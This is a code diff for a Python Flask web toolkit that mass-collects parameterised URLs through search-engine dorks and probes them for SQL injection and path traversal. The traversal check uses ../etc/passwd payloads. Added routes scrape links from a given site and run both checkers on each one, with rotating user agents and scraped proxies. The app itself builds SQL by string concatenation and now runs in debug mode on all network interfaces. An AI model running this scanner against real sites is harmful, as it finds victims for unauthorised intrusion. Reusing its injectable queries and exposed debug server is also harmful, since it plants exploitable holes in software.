@@ -17,6 +17,10 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxy_lst = []
 domains_lst = []
+hrefs = []
+
+dorker_urls = '''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)'''
+urls_to_check = '''INSERT OR IGNORE INTO urls_to_check VALUES (?, ?)'''
 
 payload = [
     r'../../../../../../../../../../../../../../../../../etc/passwd',
@@ -33,13 +37,17 @@ ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
       'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
       'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']
 
-header = {
-    'User-agent': random.choice(ua),
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept': '*/*',
-    'Connection': 'keep-alive'}
 
-http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)
+def header_gen():
+    header = {
+        'User-agent': random.choice(ua),
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'}
+
+    http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)
+
+    return http
 
 
 def builtwith(u, headers=None, html=None):
@@ -53,7 +61,7 @@ def builtwith(u, headers=None, html=None):
     # Download content
     if None in (headers, html):
         try:
-            req = http.request("GET", u)
+            req = header_gen().request("GET", u, retries=Retry(2), timeout=Timeout(4))
             if headers is None:
                 headers = req.headers
             if html is None:
@@ -177,7 +185,7 @@ def whois():
         result['name'] = name
         print(json.dumps(result, indent=4))
 
-    return render_template("tools.html", whoisdata=json2html.convert(json=json.dumps(result, indent=4)), tool="Whois")
+    return render_template("tools.html", data=json2html.convert(json=json.dumps(result, indent=4)), tool="Whois")
 
 
 def dorker(dork):
@@ -192,26 +200,96 @@ def dorker(dork):
 
         # SEARCH-RESULTS.COM
         try:
-            send1 = http.request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(page),
-                                 retries=Retry(2), timeout=Timeout(4))
+            send1 = header_gen().request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(page),
+                                         retries=Retry(2), timeout=Timeout(4))
             try:
-                parsing1 = BeautifulSoup(send1.data.decode('utf-8'), features="html.parser")
-            except urllib3.exceptions.DecodeError:
-                print("Trying latin-1...")
+                parsing1 = BeautifulSoup(send1.data, features="html.parser")
+            except Exception as ex:
+                print("Error:\n" + str(ex) + "Trying latin-1...")
                 parsing1 = BeautifulSoup(send1.data.decode('latin-1'), features="html.parser")
 
             for url in parsing1.find_all("cite"):
                 print(url.string)
-
                 if "=" in url.string:
-                    sql.execute('''INSERT OR IGNORE INTO urls_to_check VALUES (?, ?)''', (str(datetime.date.today()),
-                                                                                          str(url.string)))
-                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
-                                                                                           str(dork), str(url.string)))
+                    sql.execute(urls_to_check, (str(datetime.date.today()), str(url.string)))
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.string)))
                     db.commit()
                 else:
-                    sql.execute('''INSERT OR IGNORE INTO dorker_urls VALUES (?, ?, ?)''', (str(datetime.date.today()),
-                                                                                           str(dork), str(url.string)))
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.string)))
+                    db.commit()
+
+        except Exception as ex:
+            print("Error:\n" + str(ex))
+
+        # SEARCH.AUONE.JP
+        try:
+            send2 = header_gen().request("GET", "https://search.auone.jp/?q=" + dork + "&ie=UTF-8&page=" + str(page),
+                                         retries=Retry(3), timeout=Timeout(5))
+
+            try:
+                parsing2 = BeautifulSoup(send2.data, features="html.parser")
+            except Exception as ex:
+                print("Error:\n" + str(ex) + "Trying latin-1...")
+                parsing2 = BeautifulSoup(send2.data.decode('latin-1'), features="html.parser")
+
+            for u in parsing2.find_all("h2", class_="web-Result__site u-TextEllipsis"):
+                for url in u.find_all("a"):
+                    print(str(url.get('href')))
+                    if "=" in url.string:
+                        sql.execute(urls_to_check, (str(datetime.date.today()), str(url.get("href"))))
+                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.get("href"))))
+                        db.commit()
+                    else:
+                        sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.get("href"))))
+                        db.commit()
+
+        except Exception as ex:
+            print("Error:\n" + str(ex))
+
+        # LITE.QWANT.COM
+        try:
+            send3 = header_gen().request("GET", "https://lite.qwant.com/?q=" + dork + "&p=" + str(page),
+                                         retries=Retry(4), timeout=Timeout(5))
+
+            try:
+                parsing3 = BeautifulSoup(send3.data, features="html.parser")
+            except Exception as ex:
+                print("Error:\n" + str(ex) + "Trying latin-1...")
+                parsing3 = BeautifulSoup(send3.data.decode('latin-1'), features="html.parser")
+
+            for url in parsing3.find_all("p", class_="url"):
+                print(str(url.string).replace(" ", ""))
+                if "=" in str(url.string).replace(" ", ""):
+                    sql.execute(urls_to_check, (str(datetime.date.today()), str(url.string).replace(" ", "")))
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork),
+                                              str(str(url.string).replace(" ", ""))))
+                    db.commit()
+                else:
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork),
+                                              str(str(url.string).replace(" ", ""))))
+                    db.commit()
+
+        except Exception as ex:
+            print("Error:\n" + str(ex))
+
+        # INT.SEARCH.MYWEBSEARCH.COM
+        try:
+            send5 = header_gen().request("GET", "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?searchfor="
+                                         + dork + "&pn=" + str(page), retries=Retry(4), timeout=Timeout(5))
+
+            try:
+                parsing5 = BeautifulSoup(send5.data, features="html.parser")
+            except Exception as ex:
+                print("Error:\n" + str(ex) + "Trying latin-1...")
+                parsing5 = BeautifulSoup(send5.data.decode('latin-1'), features="html.parser")
+            for url in parsing5.find_all("cite"):
+                print(str(url.string))
+                if "=" in url.string:
+                    sql.execute(urls_to_check, (str(datetime.date.today()), str(url.string)))
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.string)))
+                    db.commit()
+                else:
+                    sql.execute(dorker_urls, (str(datetime.date.today()), str(dork), str(url.string)))
                     db.commit()
 
         except Exception as ex:
@@ -219,13 +297,13 @@ def dorker(dork):
 
         # KVASIR.NO
         try:
-            send6 = http.request("GET", "https://www.kvasir.no/alle?offset=" + str(page * 10) + "&q=" + dork,
-                                 retries=Retry(2), timeout=Timeout(4))
+            send6 = header_gen().request("GET", "https://www.kvasir.no/alle?offset=" + str(page * 10) + "&q=" + dork,
+                                         retries=Retry(2), timeout=Timeout(4))
 
             try:
-                parsing6 = BeautifulSoup(send6.data.decode('utf-8'), features="html.parser")
-            except urllib3.exceptions.DecodeError:
-                print("Trying latin-1...")
+                parsing6 = BeautifulSoup(send6.data, features="html.parser")
+            except Exception as ex:
+                print("Error:\n" + str(ex) + "Trying latin-1...")
                 parsing6 = BeautifulSoup(send6.data.decode('latin-1'), features="html.parser")
 
             for url in parsing6.find_all("p", class_="Source-sc-3jcynm-0 kBIaaJ"):
@@ -249,10 +327,6 @@ def dorker(dork):
 
 @app.route("/dorker")
 def dorker_route():
-    # global pages_to_crawl
-    # pages_to_crawl = request.args.get("pagesmax", default=10, type=int)
-    # threads = request.args.get("threads", default=5, type=int)
-
     dorks = request.args.get("dorks", default="none", type=str)
     db = sqlite3.connect("dorker.db")
     sql = db.cursor()
@@ -284,11 +358,11 @@ def lfi_checker(url_list):
             # 1
             if number_of_parameters == 2:
                 try:
-                    print("Trying " + site[0] + "=PAYLOAD")
+                    print("[!] Trying " + site[0] + "=PAYLOAD")
                     for exploit in payload:
                         # Request with payload
-                        http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
-                                                     timeout=Timeout(9))
+                        http_request1 = header_gen().request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
+                                                             timeout=Timeout(9))
                         http_response1 = str(http_request1.data)
 
                         if "root:" in http_response1:
@@ -303,14 +377,14 @@ def lfi_checker(url_list):
             # 2
             elif number_of_parameters == 3:
                 try:
-                    print("Trying " + str(url_list.split("&")[0]) + "&" + str(
+                    print("[!] Trying " + str(url_list.split("&")[0]) + "&" + str(
                         url_list.split("&")[1].split("=")[0]) + "=PAYLOAD")
                     for exploit in payload:
 
                         # Request with payload
-                        http_request2_1 = http.request("GET", str(url_list.split("&")[0]) + "&" +
-                                                       str(url_list.split("&")[1].split("=")[0]) + "=" + exploit,
-                                                       retries=Retry(4), timeout=Timeout(9))
+                        http_request2_1 = header_gen().request("GET", str(url_list.split("&")[0]) + "&" +
+                                                               str(url_list.split("&")[1].split("=")[0]) + "=" +
+                                                               exploit, retries=Retry(4), timeout=Timeout(9))
                         http_response2_1 = str(http_request2_1.data)
 
                         if "root:" in http_response2_1:
@@ -324,9 +398,9 @@ def lfi_checker(url_list):
                         # Request with payload
                         print(str(url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(
                             url_list.split("&")[1]))
-                        http_request2_2 = http.request("GET", str(
-                            url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(url_list.split("&")[1]),
-                                                       retries=Retry(4), timeout=Timeout(9))
+                        http_request2_2 = header_gen().request("GET", str(url_list.split("&")[0].split("=")[0]) + "=" +
+                                                               exploit + "&" + str(url_list.split("&")[1]),
+                                                               retries=Retry(4), timeout=Timeout(9))
                         http_response2_2 = str(http_request2_2.data)
                         if "root:" in http_response2_2:
                             print("[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" +
@@ -344,8 +418,8 @@ def lfi_checker(url_list):
                     print("Trying " + site[0] + "=PAYLOAD")
                     for exploit in payload:
                         # Request with payload
-                        http_request3_1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
-                                                       timeout=Timeout(9))
+                        http_request3_1 = header_gen().request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
+                                                               timeout=Timeout(9))
                         http_request3_1 = str(http_request3_1.data)
                         if "root:" in http_request3_1:
                             print("[+] Vulnerable URL: " + site[0] + "=" + exploit)
@@ -400,7 +474,7 @@ def sqli_checker(site):
     error3 = "Error Occurred While Processing Request"
     if "=" in site:
         try:
-            send = http.request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))
+            send = header_gen().request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))
             p = BeautifulSoup(send.data, features="html.parser")
             parsing = p.prettify()
 
@@ -445,7 +519,7 @@ def sqli_route():
     db.commit()
 
     if limit != "none":
-        # WHERE 'url_' LIKE '%=%'
+        # SELECT url_ FROM dorker_urls WHERE url_ LIKE '%=%'
         for site in sql.execute("""SELECT url_ from urls_to_check ORDER BY date_ DESC LIMIT """ + limit):
             site_list.append(site[0])
         print(site_list)
@@ -465,12 +539,13 @@ def sqli_route():
 
 @app.route("/reverse_ip")
 def reverse_ip():
+    global domains_lst
     ip = request.args.get("ip", default="none", type=str)
     domains_lst.clear()
 
     if ip != "none":
-        send = http.request("GET", "https://reverseip.domaintools.com/search/?q=" + str(ip), retries=Retry(4),
-                            timeout=Timeout(5))
+        send = header_gen().request("GET", "https://reverseip.domaintools.com/search/?q=" + str(ip), retries=Retry(4),
+                                    timeout=Timeout(5))
         parsing = BeautifulSoup(send.data, features="html.parser")
         for d in parsing.find_all("span", title=str(ip)):
             if d.string is not None:
@@ -485,8 +560,8 @@ def subdomains():
     domains_lst.clear()
 
     if domain != "none":
-        send = http.request("GET", "https://dns.bufferover.run/dns?q=" + domain, retries=Retry(4),
-                            timeout=Timeout(5))
+        send = header_gen().request("GET", "https://dns.bufferover.run/dns?q=" + domain, retries=Retry(4),
+                                    timeout=Timeout(5))
         try:
             parsing = send.data.decode("utf-8")
         except Exception as exc:
@@ -510,10 +585,11 @@ def page_not_found(e):
 def proxy():
     global proxy_lst
     p_type = request.args.get("type", default="http", type=str)
+    proxy_lst.clear()
 
     try:
-        req = http.request("GET", "https://api.proxyscrape.com/?request=getproxies&proxytype=" + p_type +
-                           "&timeout=500&country=all", retries=Retry(3), timeout=Timeout(5))
+        req = header_gen().request("GET", "https://api.proxyscrape.com/?request=getproxies&proxytype=" + p_type +
+                                   "&timeout=500&country=all", retries=Retry(3), timeout=Timeout(5))
         decoded = (req.data.decode("utf-8"))
         for url in decoded.split("\n"):
             if url not in proxy_lst:
@@ -521,6 +597,90 @@ def proxy():
         return render_template("tools.html", data=proxy_lst, tool="Proxy scraper")
     except Exception as ex:
         print(str(ex))
+
+
+def href_parser(link):
+    global hrefs
+    print("Scraping links from target: " + link)
+
+    send = header_gen().request("GET", link, retries=Retry(3), timeout=Timeout(5))
+    try:
+        parsing = BeautifulSoup(send.data, features="html.parser")
+    except Exception as ex:
+        print("Error:\n" + str(ex) + "Trying latin-1...")
+        parsing = BeautifulSoup(send.data.decode('latin-1'), features="html.parser")
+
+    for links in parsing.find_all("a"):
+        if str(links.get('href')) == "None":
+            continue
+        elif str(links.get('href')) == 'javascript:void(0)':
+            continue
+        elif str(links.get('href')) == '#':
+            continue
+        elif str(links.get('href')) == "#!":
+            continue
+        else:
+            url = links.get('href')
+
+            if url.startswith("/"):
+                print(link + str(url))
+                hrefs.append(link + str(url))
+            elif not url.startswith("http"):
+                print(link + "/" + str(url))
+                hrefs.append(link + "/" + str(url))
+            else:
+                print(str(url))
+                hrefs.append(url)
+
+
+@app.route("/links")
+def links_scan():
+    global hrefs
+    site = request.args.get("site", default="none", type=str)
+    hrefs.clear()
+
+    if site != "none":
+        href_parser(site)
+
+    return render_template("tools.html", data=hrefs, tool="Links scraper")
+
+
+@app.route("/specific_scan")
+def specific_scan():
+    global hrefs
+    site = request.args.get("site", default="none", type=str)
+    hrefs.clear()
+
+    db = sqlite3.connect("dorker.db")
+    sql = db.cursor()
+    sql.execute('''CREATE TABLE IF NOT EXISTS vuln_urls (date_ TEXT, url_ TEXT PRIMARY KEY)''')
+    db.commit()
+
+    if site != "none":
+        href_parser(site)
+
+        for url in hrefs:
+            sqli_checker(url)
+            lfi_checker(url)
+
+    return render_template("tools.html", data=sql.execute("""SELECT * from vuln_urls ORDER BY date_ DESC"""),
+                           tool="Specific scan")
+
+
+def dir_brute(url):
+    print("Target: " + url)
+    print("WORK IN PROGRESS")
+    pass
+
+
+@app.route("/directory_bruteforce")
+def directory_bruteforce():
+    target = request.args.get("target", default="none", type=str)
+
+    if target != "none":
+        dir_brute(target)
+
+    return render_template("tools.html", data="WORK IN PROGRESS", tool="Directory bruteforce")
 
 
 @app.route("/sqlquery")
@@ -542,11 +702,10 @@ def index():
     sql.execute('''CREATE TABLE IF NOT EXISTS dorker_urls (date_ TEXT, dork_ TEXT, url_ TEXT PRIMARY KEY)''')
     db.commit()
 
-    return render_template("index.html", data=sql.execute('''SELECT * FROM dorker_urls ORDER BY %s DESC''' %
-                                                                    sort_by))
+    return render_template("index.html", data=sql.execute('''SELECT * FROM dorker_urls ORDER BY %s DESC''' % sort_by))
 
 
 if __name__ == '__main__':
     data = json.load(open("apps.json.py", "r"))
     freeze_support()
-    app.run(debug=True, port=1337, use_reloader=False)
+    app.run(debug=True, port=1337, use_reloader=False, host="0.0.0.0")
